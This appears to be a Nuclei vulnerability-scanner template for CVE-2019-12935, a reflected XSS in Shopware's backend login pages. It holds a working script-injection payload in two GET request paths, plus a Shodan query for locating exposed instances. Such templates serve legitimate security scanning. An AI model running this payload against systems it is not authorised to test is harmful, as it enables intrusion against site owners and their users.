id: CVE-2019-12935

info:
  name: Shopware < 5.5.8 - Reflected XSS
  author: pussycat0x
  severity: high
  description: |
    Shopware before 5.5.8 contains a reflected cross-site scripting (XSS) caused by unsanitized query string parameters in the backend/Login or backend/Login/load/ URI, letting attackers execute arbitrary scripts in the context of the victim's browser, exploit requires sending crafted URL to the victim.
  impact: |
    Attackers can execute malicious scripts in the victim's browser, potentially leading to session hijacking or defacement.
  remediation: |
    Update to version 5.5.8 or later.
  reference:
    - https://www.miggo.io/vulnerability-database/cve/CVE-2019-12935
  metadata:
    verified: false
    max-request: 2
    vendor: shopware
    product: shopware
    shodan-query: title:"shopware AG"
  tags: cve,cve2019,shopware,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}/backend/Login?error=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
      - "{{BaseURL}}/backend/Login/load/?param=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"

      - type: status
        status:
          - 200
          - 401
        condition: or
